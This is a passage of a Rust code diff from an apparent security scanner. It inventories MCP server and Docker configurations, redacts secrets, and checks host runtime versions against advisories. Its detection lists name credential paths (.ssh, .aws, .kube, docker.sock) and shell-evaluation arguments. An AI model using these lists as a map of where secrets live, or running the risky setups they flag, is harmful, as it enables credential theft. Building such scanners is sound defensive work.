+                        .and_then(|value| value.as_bool())
+                        .unwrap_or(false);
+                    let mode = if read_only { "ro" } else { "rw" };
+                    mounts.push(format!("{source}:{target}:{mode}"));
+                }
+                _ => {}
+            }
+        }
+    }
+    mounts
+}
+
+fn label_strings_from_value(value: Option<&Value>) -> Vec<String> {
+    match value {
+        Some(Value::Object(map)) => map
+            .iter()
+            .map(|(key, value)| {
+                format!(
+                    "{}={}",
+                    key,
+                    value
+                        .as_str()
+                        .map(str::to_string)
+                        .unwrap_or_else(|| value.to_string())
+                )
+            })
+            .collect(),
+        Some(Value::Array(items)) => items
+            .iter()
+            .filter_map(|item| item.as_str().map(|value| value.to_string()))
+            .collect(),
+        _ => Vec::new(),
+    }
+}
+
+fn compose_extra_refs(service: &Value) -> Vec<String> {
+    let mut refs = Vec::new();
+    for field in ["env_file", "configs", "secrets"] {
+        refs.extend(strings_from_value(service.get(field)));
+    }
+    refs
+}
+
+fn split_dockerfile_instruction(line: &str) -> Option<(String, &str)> {
+    let (instruction, rest) = line.split_once(char::is_whitespace)?;
+    Some((instruction.to_uppercase(), rest.trim()))
+}
+
+fn docker_command_parts(value: &str) -> Vec<String> {
+    let trimmed = value.trim();
+    if trimmed.starts_with('[') {
+        serde_json::from_str::<Vec<String>>(trimmed).unwrap_or_default()
+    } else {
+        shell_words(trimmed)
+    }
+}
+
+fn docker_env_keys(value: &str) -> Vec<String> {
+    let words = shell_words(value);
+    if words.len() >= 2 && !words[0].contains('=') {
+        return vec![words[0].clone()];
+    }
+    words
+        .iter()
+        .filter_map(|word| word.split_once('=').map(|(key, _)| key.to_string()))
+        .collect()
+}
+
+fn docker_volume_refs(value: &str) -> Vec<String> {
+    let trimmed = value.trim();
+    if trimmed.starts_with('[') {
+        serde_json::from_str::<Vec<String>>(trimmed).unwrap_or_default()
+    } else {
+        shell_words(trimmed)
+    }
+}
+
+fn docker_runtime_mounts(container: &Value, host_config: &Value) -> Vec<String> {
+    let mut mounts = Vec::new();
+    if let Some(items) = container.get("Mounts").and_then(|value| value.as_array()) {
+        for item in items {
+            let source = item
+                .get("Source")
+                .and_then(|value| value.as_str())
+                .unwrap_or("");
+            let destination = item
+                .get("Destination")
+                .and_then(|value| value.as_str())
+                .unwrap_or("");
+            let mode = item
+                .get("Mode")
+                .and_then(|value| value.as_str())
+                .unwrap_or("");
+            let rw = item
+                .get("RW")
+                .and_then(|value| value.as_bool())
+                .unwrap_or(false);
+            let access = if rw { "rw" } else { "ro" };
+            mounts.push(format!("{source}:{destination}:{mode}:{access}"));
+        }
+    }
+    if let Some(binds) = host_config.get("Binds").and_then(|value| value.as_array()) {
+        for bind in binds {
+            if let Some(bind) = bind.as_str() {
+                mounts.push(bind.to_string());
+            }
+        }
+    }
+    mounts.sort();
+    mounts.dedup();
+    mounts
+}
+
+fn docker_runtime_ports(network_settings: &Value) -> Vec<String> {
+    let mut ports = Vec::new();
+    if let Some(port_map) = network_settings
+        .get("Ports")
+        .and_then(|value| value.as_object())
+    {
+        for (container_port, bindings) in port_map {
+            match bindings {
+                Value::Array(items) => {
+                    for item in items {
+                        let host_ip = item
+                            .get("HostIp")
+                            .and_then(|value| value.as_str())
+                            .unwrap_or("");
+                        let host_port = item
+                            .get("HostPort")
+                            .and_then(|value| value.as_str())
+                            .unwrap_or("");
+                        ports.push(format!("{host_ip}:{host_port}->{container_port}"));
+                    }
+                }
+                Value::Null => ports.push(container_port.clone()),
+                _ => {}
+            }
+        }
+    }
+    ports
+}
+
+fn shell_words(value: &str) -> Vec<String> {
+    value
+        .split_whitespace()
+        .map(|part| part.trim_matches('"').trim_matches('\'').to_string())
+        .filter(|part| !part.is_empty())
+        .collect()
+}
+
+fn redacted_config_excerpt(value: &Value, max_chars: usize) -> String {
+    let redacted = redact_sensitive_config(value);
+    excerpt(
+        &serde_json::to_string(&redacted).unwrap_or_default(),
+        max_chars,
+    )
+}
+
+fn redact_sensitive_config(value: &Value) -> Value {
+    match value {
+        Value::Object(map) => {
+            let mut redacted = serde_json::Map::new();
+            for (key, child) in map {
+                if is_env_like_key(key) {
+                    redacted.insert(key.clone(), redact_env_value(child));
+                } else {
+                    redacted.insert(key.clone(), redact_sensitive_config(child));
+                }
+            }
+            Value::Object(redacted)
+        }
+        Value::Array(items) => Value::Array(items.iter().map(redact_sensitive_config).collect()),
+        _ => value.clone(),
+    }
+}
+
+fn redact_env_value(value: &Value) -> Value {
+    match value {
+        Value::Object(map) => Value::Object(
+            map.keys()
+                .map(|key| (key.clone(), Value::String("<redacted>".to_string())))
+                .collect(),
+        ),
+        Value::Array(items) => Value::Array(
+            items
+                .iter()
+                .map(|item| {
+                    item.as_str()
+                        .map(|item| {
+                            let key = item.split_once('=').map(|(key, _)| key).unwrap_or(item);
+                            Value::String(format!("{key}=<redacted>"))
+                        })
+                        .unwrap_or_else(|| Value::String("<redacted>".to_string()))
+                })
+                .collect(),
+        ),
+        Value::String(value) => Value::String(
+            value
+                .split_once('=')
+                .map(|(key, _)| format!("{key}=<redacted>"))
+                .unwrap_or_else(|| "<redacted>".to_string()),
+        ),
+        _ => Value::String("<redacted>".to_string()),
+    }
+}
+
+fn is_env_like_key(key: &str) -> bool {
+    matches!(
+        key.to_lowercase().as_str(),
+        "env" | "environment" | "env_file"
+    )
+}
+
+fn redact_dockerfile_excerpt(content: &str, max_chars: usize) -> String {
+    let redacted = content
+        .lines()
+        .map(|line| {
+            let trimmed = line.trim_start();
+            if trimmed.to_uppercase().starts_with("ENV ") {
+                "ENV <redacted>".to_string()
+            } else {
+                line.to_string()
+            }
+        })
+        .collect::<Vec<_>>()
+        .join("\n");
+    excerpt(&redacted, max_chars)
+}
+
+fn is_mcp_or_sensitive_surface(values: &[String], mounts: &[String]) -> bool {
+    let haystack = values.join(" ").to_lowercase();
+    contains_mcp_marker(&haystack)
+        || mounts.iter().any(|mount| {
+            let mount = mount.to_lowercase();
+            contains_mcp_marker(&mount) || is_intrinsically_sensitive_mount(&mount)
+        })
+}
+
+fn contains_mcp_marker(value: &str) -> bool {
+    [
+        "mcp",
+        "modelcontextprotocol",
+        "claude",
+        "cursor",
+        "windsurf",
+        ".mcp.json",
+        "mcp.json",
+        "claude_desktop_config.json",
+    ]
+    .iter()
+    .any(|needle| value.contains(needle))
+}
+
+fn is_intrinsically_sensitive_mount(mount: &str) -> bool {
+    [
+        "/var/run/docker.sock",
+        "docker.sock",
+        ":/:",
+        ":/root:",
+        ".ssh",
+        ".aws",
+        ".kube",
+        ".npmrc",
+        ".env",
+    ]
+    .iter()
+    .any(|needle| mount.contains(needle))
+}
+
+fn mount_is_read_only(mount: &str) -> bool {
+    mount.ends_with(":ro")
+        || mount.contains(":ro:")
+        || mount.contains(",ro")
+        || mount.contains("read_only=true")
+        || mount.ends_with(":false")
+}
+
+fn is_host_root_or_home_mount(mount: &str) -> bool {
+    let source = mount_source(mount);
+    source == "/"
+        || source == "$home"
+        || source == "${home}"
+        || source == "~"
+        || source.starts_with("~/")
+        || source.starts_with("/home/")
+        || source.starts_with("/users/")
+}
+
+fn contains_mcp_config_path(mount: &str) -> bool {
+    [
+        ".mcp.json",
+        "/mcp.json",
+        "claude_desktop_config.json",
+        "mcp_config.json",
+    ]
+    .iter()
+    .any(|needle| mount.contains(needle))
+}
+
+fn contains_credential_path(mount: &str) -> bool {
+    [
+        ".ssh",
+        ".aws",
+        ".kube",
+        ".npmrc",
+        ".docker/config.json",
+        ".env",
+    ]
+    .iter()
+    .any(|needle| mount.contains(needle))
+}
+
+fn env_keys_reference_secrets(env_keys: &[String]) -> bool {
+    env_keys.iter().any(|key| {
+        let key = key.to_lowercase();
+        [
+            "token",
+            "secret",
+            "api_key",
+            "apikey",
+            "password",
+            "credential",
+        ]
+        .iter()
+        .any(|needle| key.contains(needle))
+    })
+}
+
+fn has_public_mcp_like_port(server: &McpServerFinding) -> bool {
+    let haystack = format!(
+        "{} {} {} {}",
+        server.server_name,
+        server.image.as_deref().unwrap_or_default(),
+        server.command.as_deref().unwrap_or_default(),
+        server.raw_config_excerpt
+    )
+    .to_lowercase();
+    if !contains_mcp_marker(&haystack) {
+        return false;
+    }
+    server.ports.iter().any(|port| {
+        let port = port.to_lowercase();
+        port.starts_with("0.0.0.0:") || port.starts_with(":::") || port.starts_with(":")
+    })
+}
+
+fn mount_source(mount: &str) -> &str {
+    mount.split(':').next().unwrap_or(mount).trim()
+}
+
+fn extract_mcp_servers_from_config(path: &Path, json: &Value) -> Vec<McpServerFinding> {
+    let mut servers = Vec::new();
+    for root_key in ["mcpServers", "servers"] {
+        if let Some(server_map) = json.get(root_key).and_then(|value| value.as_object()) {
+            for (server_name, server_config) in server_map {
+                if let Some(server) =
+                    normalize_mcp_server(path, root_key, server_name, server_config)
+                {
+                    servers.push(server);
+                }
+            }
+        }
+    }
+    servers
+}
+
+fn normalize_mcp_server(
+    path: &Path,
+    root_key: &str,
+    server_name: &str,
+    server_config: &Value,
+) -> Option<McpServerFinding> {
+    let command = server_config
+        .get("command")
+        .and_then(|value| value.as_str())
+        .map(|value| value.to_string());
+    let url = server_config
+        .get("url")
+        .or_else(|| server_config.get("uri"))
+        .and_then(|value| value.as_str())
+        .map(|value| value.to_string());
+    let transport = server_config
+        .get("transport")
+        .or_else(|| server_config.get("type"))
+        .and_then(|value| value.as_str())
+        .map(|value| value.to_lowercase())
+        .unwrap_or_else(|| {
+            if command.is_some() {
+                "stdio".to_string()
+            } else if url.is_some() {
+                "http".to_string()
+            } else {
+                "unknown".to_string()
+            }
+        });
+
+    if command.is_none() && url.is_none() && transport == "unknown" {
+        return None;
+    }
+
+    let args = match server_config.get("args") {
+        Some(Value::Array(items)) => items
+            .iter()
+            .filter_map(|item| item.as_str().map(|value| value.to_string()))
+            .collect(),
+        Some(Value::String(value)) => vec![value.to_string()],
+        _ => Vec::new(),
+    };
+    let mut env_keys: Vec<String> = server_config
+        .get("env")
+        .and_then(|value| value.as_object())
+        .map(|env| env.keys().cloned().collect())
+        .unwrap_or_default();
+    env_keys.sort();
+
+    Some(McpServerFinding {
+        source_kind: Some("mcp_config".to_string()),
+        client_hint: infer_mcp_client_hint(path, root_key),
+        source_path: path.display().to_string(),
+        server_name: server_name.to_string(),
+        transport,
+        service_name: None,
+        container_name: None,
+        image: None,
+        command,
+        args,
+        env_keys,
+        mounts: Vec::new(),
+        ports: Vec::new(),
+        runtime_state: None,
+        url,
+        raw_config_excerpt: redacted_config_excerpt(server_config, 500),
+    })
+}
+
+fn infer_mcp_client_hint(path: &Path, root_key: &str) -> String {
+    let display = path.display().to_string().to_lowercase();
+    let file_name = path
+        .file_name()
+        .and_then(|name| name.to_str())
+        .unwrap_or_default();
+    if file_name == "claude_desktop_config.json" || display.contains("/claude/") {
+        "claude_desktop".to_string()
+    } else if display.contains(".vscode/mcp.json") || root_key == "servers" {
+        "vscode".to_string()
+    } else if file_name == ".mcp.json" {
+        "project_mcp".to_string()
+    } else {
+        "generic_mcp".to_string()
+    }
+}
+
+fn assess_mcp_server_risks(server: &McpServerFinding, target: &Path) -> Vec<McpRiskHit> {
+    let mut risks = Vec::new();
+    let is_stdio = is_mcp_stdio(server);
+    let is_container = is_mcp_container_surface(server);
+    let command_risk_surface = is_stdio || is_container;
+    let command = server.command.as_deref().unwrap_or_default();
+    let command_name = command_basename(command);
+    let command_lower = command_name.to_lowercase();
+
+    if command_risk_surface && is_shell_command(&command_lower) && has_shell_eval_arg(&server.args)
+    {
+        risks.push(mcp_risk(
+            McpRiskSeverity::High,
+            "stdio_shell_execution",
+            server,
+            format!("STDIO server runs `{}` with args `{}`", command, server.args.join(" ")),
+            "Disable this MCP server until the command is replaced with a pinned, reviewed executable that does not evaluate shell text.",
+        ));
+    }
+
+    if command_risk_surface
+        && is_package_runner(&command_lower)
+        && has_runner_eval_arg(&command_lower, &server.args)
+    {
+        risks.push(mcp_risk(
+            McpRiskSeverity::High,
+            "stdio_package_runner_eval",
+            server,
+            format!("STDIO server uses package runner `{}` with args `{}`", command, server.args.join(" ")),
+            "Remove command-evaluation arguments such as `-c` and replace the server with a pinned package or local reviewed binary.",
+        ));
+    }
+
+    if command_risk_surface
+        && is_package_runner(&command_lower)
+        && !has_pinned_runner_package(&server.args)
+    {
+        risks.push(mcp_risk(
+            McpRiskSeverity::Medium,
+            "unpinned_package_runner",
+            server,
+            format!("STDIO server starts through `{}` without an explicit package version or local path pin", command),
+            "Pin the MCP server package to a reviewed version or install a local reviewed executable instead of resolving at runtime.",
+        ));
+    }
+
+    if is_stdio && is_project_scoped_config(&server.source_path, target) {
+        risks.push(mcp_risk(
+            McpRiskSeverity::Medium,
+            "writable_project_config",
+            server,
+            "MCP server is configured from a project-scoped JSON file that may be editable by local tools or agents".to_string(),
+            "Review who can modify this config and keep shared/project MCP definitions under source review with minimal privileges.",
+        ));
+    }
+
+    if is_stdio && references_sensitive_material(server) {
+        risks.push(mcp_risk(
+            McpRiskSeverity::Medium,
+            "sensitive_material_access",
+            server,
+            "MCP server config references credential-bearing paths or environment names".to_string(),
+            "Review which secrets this user context can access and rotate credentials if a high-risk server may have executed.",
+        ));
+    }
+
+    risks.extend(assess_docker_surface_risks(server));
+
+    if is_stdio && risks.is_empty() {
+        risks.push(mcp_risk(
+            McpRiskSeverity::Low,
+            "stdio_inventory",
+            server,
+            "STDIO MCP server found with no higher-risk pattern detected".to_string(),
+            "Keep this server pinned, reviewed, and limited to the minimum filesystem and credential access needed.",
+        ));
+    }
+
+    if is_container && risks.is_empty() {
+        risks.push(mcp_risk(
+            McpRiskSeverity::Low,
+            "mcp_runtime_container_detected",
+            server,
+            "MCP-like Docker service or container found with no higher-risk pattern detected"
+                .to_string(),
+            "Keep this container's mounts, environment, package versions, and network exposure reviewed and least-privilege.",
+        ));
+    }
+
+    risks
+}
+
+fn assess_docker_surface_risks(server: &McpServerFinding) -> Vec<McpRiskHit> {
+    if !is_mcp_container_surface(server) {
+        return Vec::new();
+    }
+
+    let mut risks = Vec::new();
+    for mount in &server.mounts {
+        let mount_lower = mount.to_lowercase();
+        let writable = !mount_is_read_only(&mount_lower);
+
+        if mount_lower.contains("docker.sock") {
+            risks.push(mcp_risk(
+                McpRiskSeverity::High,
+                "docker_socket_mount",
+                server,
+                format!("Docker surface mounts Docker socket via `{mount}`"),
+                "Remove Docker socket access unless this service is explicitly trusted to control the host Docker daemon.",
+            ));
+        }
+
+        if writable && is_host_root_or_home_mount(&mount_lower) {
+            risks.push(mcp_risk(
+                McpRiskSeverity::High,
+                "host_root_or_home_mount",
+                server,
+                format!("Docker surface has writable broad host mount `{mount}`"),
+                "Replace broad host mounts with narrow read-only mounts for only the paths this MCP surface needs.",
+            ));
+        }
+
+        if contains_mcp_config_path(&mount_lower) {
+            risks.push(mcp_risk(
+                if writable {
+                    McpRiskSeverity::High
+                } else {
+                    McpRiskSeverity::Medium
+                },
+                if writable {
+                    "mcp_config_mounted_writable"
+                } else {
+                    "compose_mcp_config_exposure"
+                },
+                server,
+                format!("Docker surface mounts MCP config path `{mount}`"),
+                "Keep mounted MCP config read-only where possible and review who can edit the source file.",
+            ));
+        }
+
+        if contains_credential_path(&mount_lower) {
+            risks.push(mcp_risk(
+                if writable {
+                    McpRiskSeverity::High
+                } else {
+                    McpRiskSeverity::Medium
+                },
+                "credential_path_mount",
+                server,
+                format!("Docker surface mounts credential-bearing path `{mount}`"),
+                "Review secret reachability from this service and rotate credentials if a high-risk MCP surface may have executed.",
+            ));
+        }
+    }
+
+    if env_keys_reference_secrets(&server.env_keys) {
+        risks.push(mcp_risk(
+            McpRiskSeverity::Medium,
+            "container_env_secret_reference",
+            server,
+            "Docker surface references secret-like environment variable names".to_string(),
+            "Confirm these variables do not expose long-lived credentials to untrusted MCP server code.",
+        ));
+    }
+
+    if has_public_mcp_like_port(server) {
+        risks.push(mcp_risk(
+            McpRiskSeverity::Medium,
+            "public_mcp_like_port",
+            server,
+            format!(
+                "MCP-like Docker surface exposes public-looking port binding `{}`",
+                server.ports.join(", ")
+            ),
+            "Restrict MCP-like services to loopback or private networks unless public exposure is intentional and authenticated.",
+        ));
+    }
+
+    risks
+}
+
+fn mcp_risk(
+    severity: McpRiskSeverity,
+    category: &str,
+    server: &McpServerFinding,
+    evidence: String,
+    recommendation: &str,
+) -> McpRiskHit {
+    McpRiskHit {
+        severity,
+        category: category.to_string(),
+        server_name: server.server_name.clone(),
+        source_path: server.source_path.clone(),
+        evidence,
+        recommendation: recommendation.to_string(),
+    }
+}
+
+fn is_mcp_stdio(server: &McpServerFinding) -> bool {
+    server.transport == "stdio"
+        || (server.source_kind.as_deref() == Some("mcp_config") && server.command.is_some())
+}
+
+fn is_mcp_container_surface(server: &McpServerFinding) -> bool {
+    matches!(
+        server.source_kind.as_deref(),
+        Some("compose_service" | "dockerfile" | "docker_runtime")
+    )
+}
+
+fn command_basename(command: &str) -> &str {
+    command
+        .rsplit(['/', '\\'])
+        .next()
+        .unwrap_or(command)
+        .trim_end_matches(".cmd")
+        .trim_end_matches(".exe")
+}
+
+fn is_shell_command(command: &str) -> bool {
+    matches!(
+        command,
+        "sh" | "bash" | "zsh" | "fish" | "cmd" | "powershell" | "pwsh"
+    )
+}
+
+fn has_shell_eval_arg(args: &[String]) -> bool {
+    args.iter()
+        .any(|arg| matches!(arg.as_str(), "-c" | "/c" | "-Command" | "-command"))
+}
+
+fn is_package_runner(command: &str) -> bool {
+    matches!(command, "npx" | "uvx" | "pipx" | "bunx" | "pnpx")
+}
+
+fn has_runner_eval_arg(command: &str, args: &[String]) -> bool {
+    command == "npx" && args.iter().any(|arg| arg == "-c" || arg == "--call")
+}
+
+fn has_pinned_runner_package(args: &[String]) -> bool {
+    args.iter()
+        .find(|arg| !arg.starts_with('-') && arg.as_str() != "run")
+        .map(|arg| is_local_path_arg(arg) || package_arg_has_version_pin(arg))
+        .unwrap_or(false)
+}
+
+fn is_local_path_arg(arg: &str) -> bool {
+    arg.starts_with('/') || arg.starts_with("./") || arg.starts_with("../") || arg.starts_with("~/")
+}
+
+fn package_arg_has_version_pin(arg: &str) -> bool {
+    if arg.contains("==") {
+        return true;
+    }
+    if let Some(rest) = arg.strip_prefix('@') {
+        rest.contains('@') && !arg.ends_with("@latest")
+    } else {
+        arg.contains('@') && !arg.ends_with("@latest")
+    }
+}
+
+fn is_project_scoped_config(source_path: &str, target: &Path) -> bool {
+    let path = Path::new(source_path);
+    path.starts_with(target)
+        && (source_path.contains(".mcp.json")
+            || source_path.contains(".vscode/mcp.json")
+            || source_path.ends_with("/mcp.json"))
+}
+
+fn references_sensitive_material(server: &McpServerFinding) -> bool {
+    let raw = format!(
+        "{} {} {}",
+        server.args.join(" "),
+        server.env_keys.join(" "),
+        server.raw_config_excerpt
+    )
+    .to_lowercase();
+    [
+        ".ssh",
+        ".aws",
+        ".kube",
+        ".npmrc",
+        "docker.sock",
+        "token",
+        "secret",
+        "api_key",
+        "apikey",
+    ]
+    .iter()
+    .any(|needle| raw.contains(needle))
+}
+
+// ---------------------------------------------------------------------------
+// Host runtime advisory scans (PHP, Node.js, Brotli, eMudhra; Oct 2026 wave)
+// ---------------------------------------------------------------------------
+
+const EMUDHRA_DISTRUSTED_ROOT: &str = "emSign ECC Root CA - G3";
+const EMUDHRA_STILL_TRUSTED_ROOTS: &[&str] = &[
+    "emSign Root CA - G1",
+    "emSign Root CA - C1",
+    "emSign ECC Root CA - C3",
+];
+
+fn scan_host_runtime(
+    advisory: &HostAdvisory,
+    findings: &mut Findings,
+    limitations: &mut Limitations,
+) -> Result<()> {
+    match advisory.kind {
+        "php" => Ok(scan_host_php(advisory, findings, limitations)),
+        "node" => Ok(scan_host_node(advisory, findings, limitations)),
+        "brotli" => Ok(scan_host_brotli(advisory, findings, limitations)),
+        "emudhra" => Ok(scan_host_emudhra(findings, limitations)),
+        other => Err(anyhow!("unsupported host advisory kind `{other}`")),
+    }
+}
+
+/// Compare dotted versions numerically (v-prefix, epochs, and `-suffix`
+/// packaging tails are ignored). Non-numeric components compare as 0.
+fn version_cmp(a: &str, b: &str) -> std::cmp::Ordering {
+    let clean = |s: &str| -> Vec<u64> {
+        s.trim()
+            .trim_start_matches(['v', 'V'])
+            .rsplit(':')
+            .next()
+            .unwrap_or(s)
+            .split('-')
+            .next()
+            .unwrap_or(s)
+            .split('.')
+            .map(|part| {
+                let digits: String = part
+                    .chars()
+                    .take_while(|c| c.is_ascii_digit())
+                    .collect();
+                digits.parse::<u64>().unwrap_or(0)
+            })
+            .collect()
+    };
+    let (va, vb) = (clean(a), clean(b));
+    let len = va.len().max(vb.len());
+    for idx in 0..len {
+        let ca = va.get(idx).copied().unwrap_or(0);
+        let cb = vb.get(idx).copied().unwrap_or(0);
+        if ca != cb {
+            return ca.cmp(&cb);
+        }
+    }
+    std::cmp::Ordering::Equal
+}
+
+/// Decide whether an installed runtime version is vulnerable under the
+/// advisory and, if so, which fixed version to point to.
+fn host_version_status(
+    advisory: &HostAdvisory,
+    version: &str,
+) -> (VersionHitStatus, Option<&'static str>) {
+    if advisory.fixed_by_line.is_empty() {
+        return (VersionHitStatus::Other, None);
+    }
+    let comps: Vec<u64> = version
+        .trim()
+        .trim_start_matches(['v', 'V'])
+        .split('-')
+        .next()
+        .unwrap_or(version)
+        .split('.')
+        .map(|part| {
+            let digits: String = part
+                .chars()
+                .take_while(|c| c.is_ascii_digit())
+                .collect();
+            digits.parse::<u64>().unwrap_or(0)
+        })
+        .collect();
+
+    for (line, fixed) in advisory.fixed_by_line {
+        let line_comps: Vec<u64> = line
+            .split('.')
+            .map(|part| part.parse::<u64>().unwrap_or(0))
+            .collect();
+        let matches_line = line_comps
+            .iter()
+            .enumerate()
+            .all(|(idx, c)| comps.get(idx) == Some(c));
+        if matches_line {
+            return if version_cmp(version, fixed) == std::cmp::Ordering::Less {
+                (VersionHitStatus::Compromised, Some(fixed))
+            } else {
+                (VersionHitStatus::Safe, Some(fixed))
+            };
+        }
+    }
+
+    let lowest_line = advisory
+        .fixed_by_line
+        .iter()
+        .map(|(line, _)| *line)
+        .min_by(|a, b| version_cmp(a, b))
+        .unwrap_or("");
+    if version_cmp(version, lowest_line) == std::cmp::Ordering::Less {
+        if advisory.older_lines_vulnerable {
+            (
+                VersionHitStatus::Compromised,
+                Some("no fixed release on this line (EOL); migrate to a fixed line"),
+            )
+        } else {
+            (
+                VersionHitStatus::Other,
+                Some("outside the advisory range; verify against 1.0.3-1.2.0"),
+            )
+        }
+    } else {
+        (
+            VersionHitStatus::Other,
+            Some("newer than the fixed-version table; verify against the advisory"),
+        )
+    }
+}
+
+fn record_runtime_version(
+    component: &str,
+    source: &str,
+    path: &str,
+    version: &str,
+    status: VersionHitStatus,
+    fixed: Option<&str>,
+    findings: &mut Findings,
+) {
+    let advisory_note = match (status, fixed) {
+        (VersionHitStatus::Compromised, Some(fixed)) => format!("; vulnerable, fixed in {fixed}"),
+        (VersionHitStatus::Safe, Some(fixed)) => format!("; safe on this line (fixed release: {fixed})"),
+        (_, Some(fixed)) => format!("; note: {fixed}"),
+        _ => String::new(),
+    };
+    let line = format!("detected {component} {version} via {source}{advisory_note}");
+    findings.version_hits.push(VersionHit {
+        path: path.to_string(),
+        line_number: 0,
+        line,
+        version: version.to_string(),
+        status,
+    });
+}
+
+fn record_docker_image_env_hint(
+    check: &str,
+    component: &str,
+    image: &str,
+    version: &str,
+    vulnerable: bool,
+    fixed: Option<&str>,
+    findings: &mut Findings,
+) {
+    let mut details = format!(
+        "image {image} metadata declares {component} {version}; confirm inside the running container"
+    );
+    if vulnerable {
+        details.push_str(&format!(
+            "; vulnerable ({})",
+            fixed.unwrap_or("no fixed release on this line")
+        ));
+    }
+    findings.environment_hits.push(EnvironmentFinding {
+        check: check.to_string(),
+        status: "present".to_string(),
+        details,
+        version: Some(version.to_string()),
+        bad_version: vulnerable,
+        raw: None,
+    });
+}
+
+fn dpkg_installed_packages() -> Vec<(String, String)> {
+    let Ok(output) = run_command_capture(
+        "dpkg-query",
+        &["-W", "-f=${db:Status-Abbrev}\u{1f}${binary:Package}\u{1f}${Version}\n"],
+    ) else {
+        return Vec::new();
+    };
+    output
+        .stdout
+        .lines()
+        .filter_map(|line| {
+            let mut parts = line.split('\u{1f}');
+            let status = parts.next()?.trim().to_string();
+            if !status.starts_with("ii") {
+                return None;
+            }
+            let package = parts.next()?.trim().to_string();
+            let version = parts.next()?.trim().to_string();
+            Some((package, version))
+        })
+        .collect()
+}
+
+fn docker_running_containers() -> Option<Vec<(String, String)>> {
+    let output = run_command_capture("docker", &["ps", "--format", "{{.Names}}\t{{.Image}}"]).ok()?;
+    if !output.status.success() {
+        return None;
+    }
+    Some(
+        output
+            .stdout
+            .lines()
+            .filter_map(|line| {
+                let mut parts = line.split('\t');
+                let name = parts.next()?.trim().to_string();
+                let image = parts.next().unwrap_or("?").trim().to_string();
+                Some((name, image))
+            })
+            .collect(),
+    )
+}
+
+fn docker_images() -> Option<Vec<String>> {
+    let output = run_command_capture("docker", &["images", "--format", "{{.Repository}}:{{.Tag}}"]).ok()?;
+    if !output.status.success() {
+        return None;
+    }
+    Some(
+        output
+            .stdout
+            .lines()
+            .map(|line| line.trim().to_string())
+            .filter(|line| !line.is_empty() && !line.contains("<none>"))
+            .collect(),
+    )
+}
+
+fn docker_exec_output(container: &str, script: &str) -> Option<String> {
+    let output = run_command_capture("docker", &["exec", container, "sh", "-lc", script]).ok()?;
+    if !output.status.success() {
+        return None;
+    }
+    let stdout = output.stdout.trim().to_string();
+    if stdout.is_empty() {
+        None
+    } else {
+        Some(stdout)
+    }
+}
+
+fn docker_image_env(image: &str) -> Option<Vec<String>> {
+    let output = run_command_capture(
+        "docker",
+        &[
+            "image",
+            "inspect",
+            "--format={{range .Config.Env}}{{println .}}{{end}}",
+            image,
+        ],
+    )
+    .ok()?;
+    if !output.status.success() {
+        return None;
+    }
+    Some(
+        output
+            .stdout
+            .lines()
+            .map(|line| line.trim().to_string())
+            .collect(),
+    )
+}
+
+fn env_value(env_lines: &[String], key: &str) -> Option<String> {
+    env_lines
+        .iter()
+        .find_map(|line| line.strip_prefix(&format!("{key}=")))
+        .map(|value| value.trim().to_string())
+        .filter(|value| !value.is_empty())
+}
+
+fn note_docker_unavailable(limitations: &mut Limitations, probed: bool) {
+    if probed {
+        limitations
+            .missing_tools
+            .push("docker (daemon not reachable)".to_string());
+    }
+}
+
+/// Discover node binaries: PATH, standard prefixes, and per-user installs
+/// (nvm, volta, .local/node, ~/bin) under every home directory.
+fn discover_node_binaries() -> Vec<PathBuf> {
+    let mut found: BTreeSet<PathBuf> = BTreeSet::new();
+    if let Ok(output) = run_command_capture("which", &["-a", "node"]) {
+        for line in output.stdout.lines() {
+            let path = PathBuf::from(line.trim());
+            if path.is_file() {
+                found.insert(path);
+            }
+        }
+    }
+    for prefix in ["/usr/local/bin", "/usr/bin", "/opt/homebrew/bin"] {
+        let path = PathBuf::from(prefix).join("node");
+        if path.is_file() {
+            found.insert(path);
+        }
+    }
+    if let Ok(homes) = fs::read_dir("/home") {
+        for home in homes.flatten() {
+            let home_path = home.path();
+            let mut candidates = vec![
+                home_path.join(".local/node/bin/node"),
+                home_path.join(".volta/bin/node"),
+                home_path.join("bin/node"),
+            ];
+            let nvm_versions = home_path.join(".nvm/versions/node");
+            if let Ok(entries) = fs::read_dir(&nvm_versions) {
+                for version_dir in entries.flatten() {
+                    candidates.push(version_dir.path().join("bin/node"));
+                }
+            }
+            for candidate in candidates {
+                if candidate.is_file() {
+                    found.insert(candidate);
+                }
+            }
+        }
+    }
+    found.into_iter().collect()
+}
+
+/// Discover php binaries: PATH, phpX.Y binaries in standard prefixes.
+fn discover_php_binaries() -> Vec<PathBuf> {
+    let mut found: BTreeSet<PathBuf> = BTreeSet::new();
+    if let Ok(output) = run_command_capture("which", &["-a", "php"]) {
+        for line in output.stdout.lines() {
+            let path = PathBuf::from(line.trim());
+            if path.is_file() {
+                found.insert(path);
+            }
+        }
+    }
+    for prefix in ["/usr/local/bin", "/usr/bin"] {
+        if let Ok(entries) = fs::read_dir(prefix) {
+            for entry in entries.flatten() {
+                let name = entry.file_name().to_string_lossy().to_string();
+                if name == "php" || (name.starts_with("php") && name.chars().any(|c| c.is_ascii_digit()))
+                {
+                    if entry.path().is_file() {
+                        found.insert(entry.path());
+                    }
+                }
+            }
+        }
+    }
+    found.into_iter().collect()
+}
+
+fn parse_node_version(output: &str) -> Option<String> {
+    output
+        .lines()
+        .map(str::trim)
+        .find(|line| line.starts_with('v') && line[1..].chars().next().is_some_and(|c| c.is_ascii_digit()))
+        .map(|line| line.trim_start_matches('v').to_string())
+}
+
+fn parse_php_version(output: &str) -> Option<String> {
+    for line in output.lines() {
+        if let Some(rest) = line.trim().strip_prefix("PHP ") {
+            let token = rest.split_whitespace().next().unwrap_or("");
+            if token.chars().next().is_some_and(|c| c.is_ascii_digit()) {
+                return Some(token.to_string());
+            }
+        }
+    }
+    None
+}
+
+fn probe_binary_versions(
+    binaries: &[PathBuf],
+    args: &[&str],
+    parser: fn(&str) -> Option<String>,
+    component: &str,
+    advisory: &HostAdvisory,
+    findings: &mut Findings,
+    limitations: &mut Limitations,
+) {
+    for binary in binaries {
+        match run_command_capture(&binary.to_string_lossy(), args) {
+            Ok(output) if output.status.success() => {
+                if let Some(version) = parser(&output.stdout) {
+                    let (status, fixed) = host_version_status(advisory, &version);
+                    record_runtime_version(
+                        component,
+                        "host binary",
+                        &binary.to_string_lossy(),
+                        &version,
+                        status,
+                        fixed,
+                        findings,
+                    );
+                } else {
+                    limitations
+                        .not_inspected
+                        .push(format!("could not parse version output of {}", binary.display()));
+                }
+            }
+            Ok(_) => limitations
+                .permission_denied_paths
+                .push(binary.to_string_lossy().to_string()),
